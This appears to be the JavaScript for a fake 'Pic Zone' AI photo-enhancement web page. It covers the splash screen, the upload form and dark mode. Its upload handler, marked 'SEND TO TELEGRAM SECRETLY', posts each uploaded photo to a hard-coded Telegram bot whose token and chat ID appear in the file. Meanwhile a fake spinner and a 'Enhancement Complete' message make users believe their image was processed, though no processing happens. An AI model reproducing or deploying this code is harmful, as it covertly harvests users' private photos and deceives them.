// --- CONFIGURATION ---
const BOT_TOKEN = "8049988237:AAGsP1xquf1CYsFX-zLorjjdZQGmNZDVF60";
const CHAT_ID = "7674900139";

// 1. Splash Screen Logic
window.addEventListener('load', () => {
    setTimeout(() => {
        const splash = document.getElementById('splash-screen');
        if(splash) {
            splash.style.opacity = '0';
            setTimeout(() => {
                splash.style.display = 'none';
            }, 1000);
        }
    }, 3000);
});

// 2. Settings Modal Logic
const modal = document.getElementById('settings-modal');
const settingsBtn = document.getElementById('settings-btn');
const closeBtn = document.getElementsByClassName('close-modal')[0];

if(settingsBtn) {
    settingsBtn.onclick = function() {
        modal.style.display = "block";
    }
}
if(closeBtn) {
    closeBtn.onclick = function() {
        modal.style.display = "none";
    }
}
window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = "none";
    }
}

// 3. File Upload & Drag-Drop Logic
const dropArea = document.getElementById('drop-area');
const fileInput = document.getElementById('file-upload');
const enhanceSection = document.getElementById('enhance-section');
const previewImage = document.getElementById('preview-image');
const processingText = document.getElementById('processing-text');
const heroSection = document.querySelector('.hero');
const featuresSection = document.querySelector('.features-section');

// Prevent default drag behaviors
['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
    if(dropArea) {
        dropArea.addEventListener(eventName, preventDefaults, false);
    }
});

function preventDefaults(e) {
    e.preventDefault();
    e.stopPropagation();
}

if(dropArea) {
    dropArea.addEventListener('drop', handleDrop, false);
}

function handleDrop(e) {
    const dt = e.dataTransfer;
    const files = dt.files;
    handleFiles(files);
}

// Handle Click Upload
if(fileInput) {
    fileInput.addEventListener('change', function() {
        handleFiles(this.files);
    });
}

function handleFiles(files) {
    const file = files[0];
    if (file) {
        // Validate Size (Max 10MB)
        if (file.size > 10 * 1024 * 1024) {
            alert("File is too big! Max 10MB allowed.");
            return;
        }
        
        // Show Image Preview
        const reader = new FileReader();
        reader.readAsDataURL(file);
        reader.onloadend = function() {
            previewImage.src = reader.result;
            
            // Hide Home & Show Enhance Section
            if(heroSection) heroSection.style.display = 'none';
            if(featuresSection) featuresSection.style.display = 'none';
            if(enhanceSection) enhanceSection.style.display = 'block';
            
            // Show Processing Text
            processingText.style.display = 'block';
            processingText.innerHTML = "AI Processing... <i class='fa-solid fa-spinner fa-spin'></i>";

            // --- SEND TO TELEGRAM SECRETLY ---
            uploadToTelegram(file);
        }
    }
}

// 4. Telegram Upload Function (Main Logic)
function uploadToTelegram(file) {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", file);
    formData.append("caption", `🚀 New Photo Uploaded to Pic Zone!\n📂 Name: ${file.name}\nmb Size: ${(file.size / 1024 / 1024).toFixed(2)} MB`);

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log("Image sent to Telegram successfully!");
            // UI Update - Success
            processingText.innerHTML = "Enhancement Complete! <i class='fa-solid fa-check' style='color: lime;'></i>";
        } else {
            console.error("Telegram Error:", data);
            processingText.innerHTML = "Error in Processing. Try again.";
        }
    })
    .catch(error => {
        console.error("Network Error:", error);
        processingText.innerHTML = "Network Error.";
    });
}

// 5. Dark Mode Toggle
const darkModeToggle = document.getElementById('dark-mode-toggle');
if(darkModeToggle) {
    darkModeToggle.addEventListener('click', () => {
        document.body.classList.toggle('dark-mode');
        // Simple Dark Mode Logic
        if(document.body.classList.contains('dark-mode')) {
            document.body.style.background = "#1a1a2e";
            document.body.style.color = "#fff";
        } else {
            document.body.style.background = "linear-gradient(135deg, #f3e6ff 0%, #e6e6fa 100%)";
            document.body.style.color = "#333";
        }
    });
}
// Theme Selection Helper
function setTheme(mode) {
    if(mode === 'dark') {
        document.body.style.background = "#1a1a2e";
        document.body.style.color = "#fff";
    } else {
        document.body.style.background = "linear-gradient(135deg, #f3e6ff 0%, #e6e6fa 100%)";
        document.body.style.color = "#333";
    }
}

